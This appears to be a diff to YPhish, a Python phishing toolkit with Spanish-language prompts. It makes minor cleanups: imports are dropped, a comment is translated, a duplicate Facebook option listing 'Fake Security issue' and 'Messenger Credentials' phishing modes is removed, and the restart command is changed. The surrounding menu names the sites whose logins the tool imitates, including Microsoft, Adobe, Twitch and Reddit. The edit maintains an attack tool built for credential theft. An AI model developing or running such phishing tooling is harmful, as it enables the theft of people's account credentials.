@@ -4,15 +4,12 @@
 BLUE, RED, WHITE, CYAN, DEFAULT, YELLOW, MAGENTA, GREEN, END, BOLD = '\33[94m', '\033[91m', '\33[97m', '\033[36m', '\033[0m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[1m'
 
 import multiprocessing
-import urllib3
 import sys
-import urllib 
 import os 
 import subprocess
 import time
 from subprocess import check_output
-from sys import stdout, exit, argv 
-from getch import pause 
+from sys import stdout, exit, argv  
 sys.path.insert(0,"lib")
 from getch import pause 
 sys.path.insert(0,"..")
@@ -34,7 +31,7 @@ Grey="\033[1;30m"
 Reset="\033[0m"
 Red="\033[1;31m"
 
-def check(host='http://google.com'): #Checking network connection.
+def check(host='http://google.com'): #Viendo si el usuario posee conexion a internet
     try:
         urlopen(host)
         print(""+Green+"Usted posee conexion a Internet,puede continuar")
@@ -731,10 +728,6 @@ def runPEnv(): #menu
           11-Twitch          23-PornHub       35-Reddit
           12-Microsoft       24-Adobe         36-Subito.it""")
     option = input(Green+"Eleccion --> "+Reset)
-    if option == '01':
-        loadModule('Facebook')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Pagina Standard\n\n 2 Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}YPhish > {1}".format(CYAN, DEFAULT))
-        runPhishing('Facebook', option2)
     if option == '1':
         loadModule('Facebook')
         option2 = ''
@@ -917,10 +910,7 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         choice = eval(input('\n\n{0}[1] {1}Return YPhish {0}[2] {1}Exit \n{2}YPhish >> {1}'.format(GREEN, DEFAULT, RED)))
         if choice == 1:
-            if os.path.isfile('/usr/local/bin/YPhish'):
-                os.system('clear && YPhish')
-            else:
-                os.system('clear && sudo python3 YPhish.py')	
+            os.system('cls && python3 YPhish.py')	
         elif choice == 2:
             time.sleep(2)
             exit(0)
